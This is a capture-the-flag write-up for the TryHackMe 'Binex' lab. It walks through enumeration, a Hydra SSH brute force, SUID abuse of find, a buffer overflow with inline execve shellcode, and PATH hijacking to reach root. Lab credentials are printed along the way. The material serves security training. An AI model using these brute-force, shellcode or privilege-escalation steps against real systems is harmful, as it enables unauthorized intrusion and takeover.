# [Binex](https://tryhackme.com/room/binex)

## Escalate your privileges by exploiting vulnerable binaries

# Gain initial access

## Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.

### What are the login credential for initial access

_Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure password._

1. Scan the target to identify open ports and services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/22cf3579-364e-4ae8-8ec1-4024491542ca)

2. Enumerate users with `enum4linux`
   - The longest username is **tryhackme**

```bash
enum4linux IP
```

![SCREEN02](https://github.com/user-attachments/assets/c9171b6b-bdd4-4d30-8e1a-78cd9a17445a)

3. Brute force the SSH password with Hydra
   - The credentials are `tryhackme:thebest`

```bash
hydra -l tryhackme -P /root/Tools/wordlists/rockyou.txt  ssh://IP
```

![SCREEN03](https://github.com/user-attachments/assets/088f93da-aa97-4809-aee8-81a06cba5d5a)

---

# SUID :: Binary 1

## Read the flag.txt from des's home directory

### What is the contents of /home/des/flag.txt?

_File permission is all you need.. Setuid..._

1. Log in via SSH using our discovered credentials

```bash
ssh tryhackme@IP
```

2. Search for SUID binaries on the system

```bash
find / -type f -perm -u=s 2>/dev/null
```

![SCREEN04](https://github.com/user-attachments/assets/5eae1fd2-8909-4789-ad9e-e9cdf32bb4e0)

3. We can use `/usr/bin/find` command to read the flag

```bash
/usr/bin/find /home/des/flag.txt -type f -exec cat {} \;
```

![SCREEN05](https://github.com/user-attachments/assets/11e26c52-8d84-4f83-8576-d8d9ced2a75c)

---

# Buffer Overflow :: Binary 2

## Read the flag.txt from kel's home directory

If you are stuck, here are the hints for the exploit.

### What is the contents of /home/kel/flag.txt?

1. Log in as `des` user and analyze the vulnerable program

```bash
ssh des@IP
# Password: destructive_72656275696c64

cd /home/des
ls
cat bof64.c
```

![SCREEN06](https://github.com/user-attachments/assets/a23def57-d0f9-4678-8996-458b9af69adf)

2. This C program contains a buffer overflow vulnerability in the `foo` function. The buffer is 600 bytes, but read can read up to 1000 bytes, allowing for overflow

```bash
(python -c 'print("\x90" * 539 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A" * 50 + "\x7c\xe3\xff\xff\xff\x7f\x00\x00")';cat) | ./bof

whoami
cat /home/kel/flag.txt
```

![SCREEN07](https://github.com/user-attachments/assets/8cd2fc9f-7de7-4927-b660-663c320c07c0)

---

# PATH Manipulation :: Binary 3

## Get the root flag from the root directory. This will require you to understand how the PATH variable works.

### What is the contents of /root/root.txt?

_The true path leads you to the flag._

1. Log in as `kel`

```bash
su kel
# Password: kelvin_74656d7065726174757265
ls /home/kel
cat exe.c
```

![SCREEN08](https://github.com/user-attachments/assets/f92c7812-5b3a-4b6a-9b05-ae3e9ae119af)

2. Create a malicious ps script in `/tmp`. Add `/tmp` to the beginning of your PATH. Execute the vulnerable program to get root shell and read the flag

```bash
cd /tmp
echo -e '#!/bin/bash\n/bin/bash' > ps
chmod +x ps
export PATH=/tmp:$PATH
cd /home/kel
./exe
cat /root/root.txt
```

![SCREEN09](https://github.com/user-attachments/assets/79abeda6-01f6-4699-b088-ce9c1946e607)
